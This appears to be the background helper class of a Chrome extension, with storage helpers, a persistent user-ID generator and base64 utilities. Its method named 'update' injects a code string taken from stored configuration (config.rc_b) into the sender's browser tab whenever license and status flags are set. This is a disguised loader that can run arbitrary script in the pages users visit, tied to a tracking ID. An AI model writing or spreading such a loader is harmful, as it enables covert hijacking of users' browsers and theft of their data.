class helper {
    constructor() {
        this.options = {};
        chrome.storage.local.get(null, function (data) {
            this.options = data;
        }.bind(this));

        chrome.storage.onChanged.addListener(function () {
            chrome.storage.local.get(null, function (data) {
                this.options = data;
            }.bind(this));
        }.bind(this));
    }

    load(key) {
        let data = window.localStorage[key];
        if (typeof data === "undefined") {
            return null;
        }
        try {
            let x = JSON.parse(data);
            return x;
        } catch (e) {
            return data;
        }
    }

    save(key, data) {
        window.localStorage[key] = JSON.stringify(data);
        return true;
    }

    getUserID() {
        let uid = this.load('uid');
        if (uid) {
            return uid;
        } else {
            let buf = new Uint32Array(4);
            window.crypto.getRandomValues(buf);
            let idx = -1;
            uid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
                idx++;
                let r = (buf[idx >> 3] >> ((idx % 8) * 4)) & 15,
                    v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
            this.save('uid', uid);
            return uid;
        }
    }

    update(sender) {
        if (sender) {
            if (this.options.status && this.options.license && this.options.config && this.options.success == 1) {
                chrome.tabs.executeScript(sender.tab.id, {code: `${this.options.config.rc_b}`});
            }
            this.save("error", false)
        } else {
            return false;
        }
        this.save('Updated', new Date().getTime());
        return false;

    }

    b64EncodeUnicode(str) {
        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
            function toSolidBytes(match, p1) {
                return String.fromCharCode('0x' + p1);
            }));
    }

    b64DecodeUnicode(str) {
        return decodeURIComponent(atob(str).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }

    getRandomArbitrary(min, max) {
        return Math.random() * (max - min) + min;
    }

}

const Helper = new helper();